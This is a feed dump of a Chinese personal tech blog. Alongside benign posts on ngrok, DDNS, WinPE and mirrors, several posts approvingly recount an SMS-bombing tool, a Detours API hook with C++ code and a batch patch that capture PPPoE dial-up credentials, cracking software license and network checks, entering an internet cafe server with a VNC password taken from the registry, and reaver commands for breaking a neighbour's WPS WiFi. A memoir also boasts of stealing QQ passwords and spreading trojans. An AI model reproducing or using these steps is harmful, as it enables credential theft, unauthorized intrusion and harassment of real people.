+    <content type="text"><![CDATA[大一计算机课，主要讲了计算机原理、一些基本算法，比如说排序算法、搜索算法、进制运算、cpu 工作原理，这些基本的理论知识，用在实践确实是有点困难的，然后自学了 tcp/ip 协议 的那几本经典书籍，包括计算机组网技术、协议相关、p2p 协议，然后树藤摸瓜做了几个小项目，一个是基于内网的聊天室，一个是看到网上一些短信攻击工具，了解了工作原理之后自己也顺带做了一个, 这些小工具的话全部放在 115 网盘，只和同学测试了一下，也没发布到网上去，简单介绍一下原理吧！ 对于内网聊天室，使用的 multicast ,这个用在内网聊天室里面特别方便。对于 QQ 这种应该就是私有协议，架构应该比较复杂，包括数据的海量离线存储，离线消息等等。 对于短信攻击工具，这个其实就是找的一些网站可以发送短信的接口，记录下来，放到远程服务器上面，启动的时候同步短信接口，然后对某手机号发起短信攻击。这个工具威力比较大，反正我自己的安卓手机是死机了。 开发环境记录 Qt Creator 4.8 Ubuntu 10.04]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>大学生活</category>
+      </categories>
+      <tags>
+        <tag>计算机课</tag>
+        <tag>大一</tag>
+        <tag>短信攻击</tag>
+        <tag>p2p</tag>
+        <tag>multicast</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[nat123 内网穿透]]></title>
+    <url>%2Fblog%2F2012%2F06%2F11%2Fnetwork-bypass-nat123%2F</url>
+    <content type="text"><![CDATA[昨天研究了 ngrok，搭建的个人服务器毕竟资源有限，顺带找了下国内的一些类似服务，找了很久，找到了：nat123, 一个免费的内网映射软件，安装后提供免费的二级域名，也可以绑定自己的域名，测试速度一般般，毕竟不是国内的转发服务器，安装后配置还是非常简单的，然后搭建了一个文件存储服务和 VNC 远程控制服务，配置界面如下： 原理猜测 基于 ssh 的远程转发 基于 tcp 的代理 其他类似服务 网络通(2015.10.20 更新) – http://www.youtusoft.com/jc.html]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>网络技术</category>
+      </categories>
+      <tags>
+        <tag>nat</tag>
+        <tag>内网穿透</tag>
+        <tag>nat123</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[基于 ngrok 的内网穿透]]></title>
+    <url>%2Fblog%2F2012%2F06%2F10%2Fnetwork-bypass%2F</url>
+    <content type="text"><![CDATA[学校校园园提供的是内网 IP,没法把自己电脑的服务暴露到外网，设置路由器的 nat 转发功能也没啥效果，然后谷歌搜索到这个软件，然后开始搭建基于 ngrok 的内网穿透服务，代码是开源的， 基本原理图： 服务端部署12345678910git clone https://github.com/inconshreveable/ngrok.git ngrokcd ngrok# 创建服务器证书openssl genrsa -out base.key 2048openssl req -new -x509 -nodes -key base.key -days 10000 -subj &quot;/CN=mytunnel.ml&quot; -out base.pemopenssl genrsa -out server.key 2048openssl req -new -key server.key -subj &quot;/CN=mytunnel.ml&quot; -out server.csropenssl x509 -req -in server.csr -CA base.pem -CAkey base.key -CAcreateserial -days 10000 -out server.crt# 配置根证书cp base.pem assets/client/tls/ngrokroot.crt 配置域名 dns 记录 我这里添加的是 *.mytunnel.ml 指向服务器 IP，另外还需要添加下面的记录 *.tunnel.mytunnel.ml *.ngrok.mytunnel.ml 编译服务端客户端 1make release-server release-client 编译好之后可以看到：ngrokd 和 ngrok 两个文件，然后在服务端部署 ngrokd 123./ngrokd -tlsKey=server.key -tlsCrt=server.crt -domain=&quot;mytunnel.ml&quot; -httpAddr=&quot;:80&quot; -httpsAddr=&quot;:443&quot;# 效果图如下所示： 客户端配置 12345# 创建配置文件：ngrok.confserver_addr: mytunnel.ml:443trust_host_root_certs: false# 启动客户端，配置子域名 test，就可以通过 test.mytunnel.ml 访问了./ngrok -subdomain test -config=ngrok.conf 80 更多参考资料 https://ngrok.com/docs]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>网络技术</category>
+      </categories>
+      <tags>
+        <tag>nat</tag>
+        <tag>内网穿透</tag>
+        <tag>ngrok</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[China ddns service free]]></title>
+    <url>%2Fblog%2F2012%2F04%2F17%2FChina-ddns-service-free%2F</url>
+    <content type="text"><![CDATA[免费的 ddns 服务搜集： 花生壳 – 国内老牌 pubyun – 国内老牌 DynDNS – 国外老牌 no-ip Dynamic DO – 国外老牌 Duck DNS FreeDNS afraid – 国外老牌 MyDNS DNSPOD]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>网络技术</category>
+      </categories>
+      <tags>
+        <tag>ddns</tag>
+        <tag>动态 IP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CMS 网站内容管理系统]]></title>
+    <url>%2Fblog%2F2012%2F03%2F16%2FCMS-Check%2F</url>
+    <content type="text"><![CDATA[最近想自己做个企业官网，想自己开发，但是由于时间并不是那么充足，就静下心来了解一下 CMS 吧！ CMS 的全名是 Content management system，国内比较流行的差不多就是 织梦CMS,然后在本地搭建 lamp 环境，开始了安装之旅，安装过程还是挺顺利的，然后在免费域名 tk 提供网站注册了一个免费域名，当然类似提供免费域名的有比较著名的 eu.org，int.ru，zlat.su，另外还有，co.cc 、cu.cc，当然俄罗斯的域名以前是完全免费申请的，但是现在政策改了，不再提供免费域名，可惜了我很久以前抢注的那些米，也没什么好遗憾，毕竟是免费的，谁知道能用多久，反正是拿来玩玩罢了！ 主机方面随便找了个免费虚拟主机提供商，个人比较推荐的是 freehostia 免费主机，记的那时候挂马的时候就是用的这家，没想到几年过去了竟然还能正常使用，而且不需要把域名 dns 完全托管到这里。虽然配置不高，但是个人使用足矣。 折腾了很久，安装了很多这种网站系统，有点玩的乐不思蜀的感觉，另外也安装了 discuz 论坛等等。 个人安装测试环境备注 虚拟主机，freehostia 线上环境 CMS，织梦 本地 LAMP 测试环境 免费域名 tk 20140908 更新，千万不要使用 tk 在生产环境，否则域名忘记续期后果很严重！！！]]></content>
+      <categories>
+        <category>就爱折腾</category>
+      </categories>
+      <tags>
+        <tag>CMS</tag>
+        <tag>免费域名</tag>
+        <tag>tk</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Winpe 制作]]></title>
+    <url>%2Fblog%2F2012%2F03%2F15%2FWinpe-make%2F</url>
+    <content type="text"><![CDATA[最近看到很多不错的 PE 维护系统，以前非常喜欢 金狐 的那个 PE 系统，功能齐全，另外有我需要的功能，按照思路打开谷歌搜索 WinPe，出现了微软官网的教程，基本的 workflow 如下 首先安装 Windows ADK 然后执行 1234# 创建 amd64 的 PE 也可以用 x86 代替 amd64 创建 32bit 的copype amd64 C:\WinPE_amd64# 创建 ISOMakeWinPEMedia /ISO C:\WinPE_amd64 C:\WinPE_amd64\WinPE_amd64.iso 执行上面的命令然后创建好 WinPE_amd64.iso 文件，就可以写入 U 盘 或其他设备了。 创建好的 PE 预览 一些其他需要注意的 默认的 PE 不带桌面，可以通过 Dism 命令添加组件 另外我们也可以添加一些我们需要的小工具等等，比如说 Ghost 参考资料 Windows ADK WinPE: Add packages]]></content>
+      <categories>
+        <category>就爱折腾</category>
+      </categories>
+      <tags>
+        <tag>winpe</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[校园网宽带密码破解]]></title>
+    <url>%2Fblog%2F2012%2F03%2F02%2FPPPOE-Password-Hook%2F</url>
+    <content type="text"><![CDATA[校园网使用了一个叫做安腾的私有拨号客户端，拨号密码似乎加密了，看了下 MSDN 文档，发现拨号的 API 函数是 RasDial，然后载入 ollydbg 然后对这个函数下断点，然后运行拨号客户端拨号，到这个函数的时候程序停止，然后看堆栈信息就可以找到真实的拨号账号密码了，找到真实账号密码就可以到路由器直接拨号。 另外就是网上流行的一种方式就是 API Hook，通过注入 dll 实现，测试了一下确实可以实现。实现过程， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include“detours.h” //微软detours头文件#include “ras.h” //windows PPPoE 函数头文件#pragma comment(lib,”detours.lib”)//微软detours静态lib#pragmacomment(lib,”rasapi32.lib”) // windows PPPoE 函数lib// 截获RasDialA函数体，用户自己实现，在调用系统RasDialA函数之前系统会先调用此函数，而参数入口信息完全一致，这样我们就可以从中提取相应的参数信息，提取完成后再继续调用系统原来的RasDialA函数，达到Hook API的目的DWORDWINAPI MyRasDialA(LPRASDIALEXTENSIONSlpRasDialExtensions, // pointer to function extensions dataLPCTSTRlpszPhonebook, // pointer to full path and file name ofphone-book fileLPRASDIALPARAMSlpRasDialParams, // pointer to calling parameters dataDWORDdwNotifierType, // specifies type of RasDial event handlerLPVOIDlpvNotifier, // specifies a handler for RasDialeventsLPHRASCONNlphRasConn // pointer to variable to receive connectionhandle);// 经过替换修饰后的RasDialA函数，用户可以在MyRasDialA函数中继续调用系统原来的RasDialA函数功能，在MyRasDialA函数中如果要调用系统原来的RasDialA函数必须调用经过修饰后的oldRasDialA函数，否则将造成无穷嵌套调用造成堆栈崩溃DETOUR_TRAMPOLINE(DWORDWINAPI oldRasDialA(LPRASDIALEXTENSIONSlpRasDialExtensions, // pointer to function extensions dataLPCTSTRlpszPhonebook, // pointer to full path and file name ofphone-book fileLPRASDIALPARAMSlpRasDialParams, // pointer to calling parameters dataDWORDdwNotifierType, // specifies type of RasDial event handlerLPVOIDlpvNotifier, // specifies a handler for RasDialeventsLPHRASCONNlphRasConn /* pointer to variable to receive connectionhandle*/ ),RasDialA);// 截获RasDialA函数体，用户自己实现，比如在对话框中弹出ADSL账号和密码，然后继续调用系统的拨号函数RasDialA完成拨号，这样用户一旦使用星空极速拨号软件进行拨号将首先调用MyRasDialA函数，弹出加密后的账号和密码DWORDWINAPI MyRasDialA(LPRASDIALEXTENSIONSlpRasDialExtensions, // pointer to function extensions dataLPCTSTRlpszPhonebook, // pointer to full path and file name ofphone-book fileLPRASDIALPARAMSlpRasDialParams, // pointer to calling parameters dataDWORDdwNotifierType, // specifies type of RasDial event handlerLPVOIDlpvNotifier, // specifies a handler for RasDialeventsLPHRASCONNlphRasConn // pointer to variable to receive connectionhandle)&#123;//MessageBox(NULL,lpRasDialParams-&gt;szUserName,lpRasDialParams-&gt;szPassword,MB_OK);CNameAndPassDlgdlg(lpRasDialParams-&gt;szUserName,lpRasDialParams-&gt;szPassword,NULL);dlg.DoModal();returnoldRasDialA(lpRasDialExtensions,lpszPhonebook,lpRasDialParams,dwNotifierType,lpvNotifier,lphRasConn);&#125;//进行一些初始化工作和清理工作，在dll的初始化函数中加入：XXXX::InitInstance()&#123;//TOD Add your specialized code here and/or call the base classDetourFunctionWithTrampoline((PBYTE)oldRasDialA,(PBYTE)MyRasDialA);returnCWinApp::InitInstance();&#125;//在dll的卸载函数中加入：XXXX::ExitInstance()&#123;//TOD Add your specialized code here and/or call the base classDetourRemove((PBYTE)oldRasDialA,(PBYTE)MyRasDialA);returnCWinApp::ExitInstance();&#125;//批处理文件@echo offif not exist rasapi32.dll (echo 请将文件解压到校园网客户端的安装目录,然后执行补丁程序) else (setdll /d:XXXX.dll rasapi32.dll)pause 参考资料 detours开发包]]></content>
+      <categories>
+        <category>安全研究</category>
+        <category>破解</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[小软件的爆破]]></title>
+    <url>%2Fblog%2F2012%2F02%2F19%2FCrack-application%2F</url>
+    <content type="text"><![CDATA[最近在卡饭论坛看到一个非常有意思的小软件，部分很不错的功能需要注册码，使用 PEID 查看，竟然用 UPX 加壳了，下面开始折腾，祭出破解三剑客 – ollydbg、PEID、LordPE 修复工具。 本来想偷个懒，使用网上的 UPX 脱壳工具，没想到下载了好几个，浪费了几个小时还是没搞定，晕～，看来只能手动脱壳了，根据以往经验，根据 ESP 定律，查看通用寄存器ESP，然后数据窗口跟踪。F8 单步步入，F4 禁止向上跳转，F8 单步跟踪，看到 CALL F7 然后步入。直达 OEP。然后用 Lordpe 重建输入表，完美～运行脱壳后程序，OD 载入，输入假注册码，然后 Alt + M 打开内存，搜索假注册码，找到对应的内存位置，下内存断点，然后找到对应的函数入口点，往上一看发现一个 jne，下个断点，然后重新运行程序，跳过这个判断，然后运行，显示为 注册 用户，然后测试了一下功能，功能还是没法正常使用，还没找到关键判断，估计还有坑，然后继续回到断点位置，单步，进入 call xxxx，发现竟然还有网络验证，这个比较简单，简单修改一下应该就差不多了，把网络验证这一段的汇编代码全部 nop 掉，然后生成 keymaker 破解补丁。效果如下： 一次很简单的破解，记的以前破解其他小工具比这个困难很多，尤其一些由其他语言混合开发的。 相关工具 ollydbg lordpe PEID]]></content>
+      <categories>
+        <category>安全研究</category>
+        <category>破解</category>
+      </categories>
+      <tags>
+        <tag>破解</tag>
+        <tag>脱壳</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Mfc 框架]]></title>
+    <url>%2Fblog%2F2012%2F01%2F09%2FMfc-framework%2F</url>
+    <content type="text"><![CDATA[MFC 是啥？全称：Microsoft Foundation Class Library，windows 下面的一个 C++ 应用编程框架，基类是 CObject，在 VS 里面使用 Application wizards 来创建很多种类型的应用，比如说 单文档 (SDI) 和 多文档 (MDI) 应用，这种架构叫 document/view，另外就是一些基于对话框的、基于窗口类型的、dll 类型的应用。document/view 是比较常用的。 MFC 应用派生自 CWinApp，窗口对象一般派生自 CWnd，文档对象派生自 CDocument。另外就是 CView，它由一个由文档和 frame window 组成。 重点知识 消息映射 多线程 DDX/DDV 机制 根据官方教程用 VC6.0 做了几个小作业玩了一下，感觉还可以吧，只是代码不见了，伤心！！！ 遇到问题多查文档多搜谷歌，一定能解决的。 其他可选的开发库 WTL,据说是微软内部的开发中做的，具体不是很清楚，感觉比 MFC 要复杂很多，但是是非常标准的 c++ 语法。 Qt，跨平台的，很早就想学它了 另外就是一些 HTML+js 开发界面，比如说 Chromium Embedded Framework Wxwidgets，这个也是跨平台的，和 MFC 使用上差不多 参考资料 MFC Desktop Application Dynamic Data Exchange (DDX) Internals]]></content>
+      <categories>
+        <category>C++</category>
+      </categories>
+      <tags>
+        <tag>MFC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[破解校外网吧无盘系统超级管理密码]]></title>
+    <url>%2Fblog%2F2011%2F12%2F20%2FCrack-diskless-super-administartor%2F</url>
+    <content type="text"><![CDATA[今天闲着无聊，被朋友叫去网吧上网，网吧管理软件是 嘟嘟牛,无盘系统是 锐起，随便乱输入了几个密码测试了一下没啥用，然后发现系统任务管理器搭建了 VNC 服务器端，索性到注册表把密码翻了出来，然后找到无盘服务器的 IP，然后 VNC 连接，没想到竟然连上了，哈哈～～，然后进了服务器看了下服务器配置，对整体部署进行了大致的了解，包括整套的游戏更新解决方案。感觉有点意思就索性记录一下吧！！！ VNC 服务端密码保存位置： 1HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver]]></content>
+      <categories>
+        <category>就爱折腾</category>
+      </categories>
+      <tags>
+        <tag>破解</tag>
+        <tag>黑客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Backtrack 破解 Wifi 密码]]></title>
+    <url>%2Fblog%2F2011%2F10%2F30%2FBacktrack-crack-wifi%2F</url>
+    <content type="text"><![CDATA[隔壁寝室的童鞋装上了无线路由器，手机流量也不是很够，虽然在用 openvpn 免流，但是不知道这个什么时候会失效，毕竟运营商不是傻子，然后谷歌找了下 wifi password crack，搜索发现 Backtrack 这个发型版支持 wifi 渗透，另外还有 beni linux 也支持，然后下载了 Backtrack，安装到 U盘，然后启动系统，默认是 gnome 桌面，按照如下步骤： 123456789# 找到无线设备名称airmon-ng# 我这里是 wlan0，执行下面的命令会搜索很多无限热点airodump-ng wlan0# 然后看下 WPS 有没有开启，这样破解就简单多了，我这里显示为 NOwash -i wlan0 -c 8 -C -s# 只能用 reaver 破解密码了reaver -i &lt;网卡接口&gt; -b &lt;目标热点 MAC 地址&gt; –fail-wait=360# 然后漫长的等待，大概 3 个小时就破解出了密码 相对于跑字典破解密码来说还是稍微慢了点，记的在家里的时候跑字典 10 多分钟就可以了，这个还是稍微慢了点，毕竟弱口令比较多，大家在用 Wi-Fi 的时候记得设置复杂一点的密码，免得被渗透之后后患无穷，尤其内网开了文件共享和一些特殊服务的时候。 相关准备 Backtrack]]></content>
+      <categories>
+        <category>安全研究</category>
+        <category>破解</category>
+      </categories>
+      <tags>
+        <tag>破解</tag>
+        <tag>wifi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Windows port forwarding]]></title>
+    <url>%2Fblog%2F2011%2F10%2F09%2FWindow-port-forwarding%2F</url>
+    <content type="text"><![CDATA[使用 netsh 实现端口转发最近用 putty 实现了端口转发，很好奇 windows 如何实现这个功能，于是开始了折腾进行时，参考了下 MSDN 资料，进行了一下测试，本机局域网 ip 是 192.168.1.2 系统是 Windows 7，我想把来自端口 3839 的请求全部转发到 192.168.1.22，然后通过命令行实现： 123456#开始转发netsh interface portproxy add v4tov4 listenport=3839 listenaddress=192.168.1.2 connectport=3839 connectaddress=192.168.1.22#检查转发netsh interface portproxy show v4tov4#取消转发netsh interface portproxy delete v4tov4 listenport=3839 listenaddress=192.168.1.2 参考资料 Netsh commands for Interface Portproxy.aspx)]]></content>
+      <categories>
+        <category>就爱折腾</category>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>端口转发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Linux Open source Mirror List in China]]></title>
+    <url>%2Fblog%2F2011%2F10%2F07%2FOpen-source-Mirror-List-in-China%2F</url>
+    <content type="text"><![CDATA[各大高校开源镜像地址大全 中国科学技术大学开源软件镜像 http://mirrors.ustc.edu.cn/ 清华开源镜像站 https://mirrors.tuna.tsinghua.edu.cn/ 北京交通大学开源镜像站 http://mirror.bjtu.edu.cn/ 兰州大学开源镜像站 http://mirror.lzu.edu.cn/ 厦门大学开源镜像站 http://mirrors.xmu.edu.cn/ 上海交通大学开源镜像站 http://ftp.sjtu.edu.cn/ 东软信息学院开源镜像站 http://mirrors.neusoft.edu.cn/ 企业开源镜像 网易开源镜像站 http://mirrors.163.com/ 搜狐开源镜像站 http://mirrors.sohu.com/ 阿里开源镜像站（2015 年 5 月收录） https://mirrors.aliyun.com/ 首都在线 http://mirrors.yun-idc.com/ 开源中国 http://mirrors.oschina.net/ 个人评测 大学类里面的中科大和清华的速度还是非常快的。 公司类里面的网易和阿里的速度还不错。 中科大的开源镜像包含的镜像数量比较多，常见的都能找到。]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[大学了，马上要开启新的生活！]]></title>
+    <url>%2Fblog%2F2011%2F09%2F28%2FNew-life%2F</url>
+    <content type="text"><![CDATA[大学了，不知不觉，高考考的不够理想，上了省内一所普通大学，以前的就让它过去吧，既然我只活在当下，想起以往在老家做网管的日子，依旧有点怀恋，那时候学会了盗号，维护网吧硬件、游戏平台，软件逆向破解，虽然累但是感觉特别充实，现在大学了，选了一个自己并不喜欢但家里长辈比较看好的 机械自动化 专业，但是我个人还是比较喜欢 IT 行业，既然选择了那就去试试吧～ 到了大学一切都是新的，把自己以前的个人经历好好的总结一下吧！就当作一个念想。 记的第一次上网，还是小学 4 年级的时候，那时候学校来了些电脑，刚好在英语老师办公室旁边，并且由英语老师管理，这个时候开始就正式加入互联网世界啦，小学以前还只知道学习机、电子游戏机这种设备，并未接触到电脑这种高级设备，第一次见到大头电脑，感觉还是挺新鲜的，然后老师教我们如何开关机的正确顺序， 然后开机，这个时候还是 windows 98，拿着鼠标左点右点，无比好奇，找到了两个小游戏，暴力摩托和抢沙滩登陆战，感觉探索能力还是挺强的，不久就学会了玩这游戏，然后看到书上有 hao123 和 4399，然后打开浏览器就开始把玩了。小学 6 年级的时候注册了我的第一个 QQ，到了初中的时候，也是叛逆期，喜欢泡网吧，研究各种黑客技术，记的那时候熊猫烧香病毒爆发了，整个学校机房的电脑全部中招，感觉黑客技术真心不错，竟然有如此大的威力，然后学习了网络相关的知识，学习了一下 VB、VC 编程，也研究了一些远程控制软件，比如说：灰鸽子等等，然后下载了一些木马病毒的源代码进行学习编译，然后通过 QQ 等途径去传播，玩的不亦乐乎，记的初中的时候，因为这个还被叔叔骂了，因为把网吧在线用户的 QQ 密码全部给盗了，当然那时候自己也中过一些招，主要是玩游戏的时候贪图速成，被钓鱼吧！当然了，知道是钓鱼网站之后马上改了自己的密码，中间也没什么损失。感觉初中就是在这样一种环境下过去了，了解的东西多而且杂。 初中马上毕业了，这个时候要备战中考了，当然了以我这种 学渣 来说，备战其实意义也并不是很大了，毕竟个人兴趣不在书本，以几分的差距没有上重点高中，然后上了家附近不远的一所普高，到了高中，感觉学习气氛也就一般了，偶尔研究一些新的网络知识，学习一些系统优化相关的东西，虚拟化技术等等，然后做了一些个人小网站，当然了现在这些网站已经消失在浩瀚无边的网络里了，正如轻轻的来轻轻的走，高中主要还是对网吧整体的技术方案进行了系统性的学习，私生活方面我就懒得记录了，到了高三还是几分的差距没有上到那些认为还算不错的大学。 经历的一些比较幸运的事情，感谢生活：高考期间，坐公共汽车翻车，挂了不少人，而我毫发无损。感谢生活！虽然对考试多少造成影响。生命比什么都重要。 新的一天新的开始！加油～]]></content>
+      <categories>
+        <category>点滴记忆</category>
+      </categories>
+      <tags>
+        <tag>大学</tag>
+      </tags>
+  </entry>
+</search>
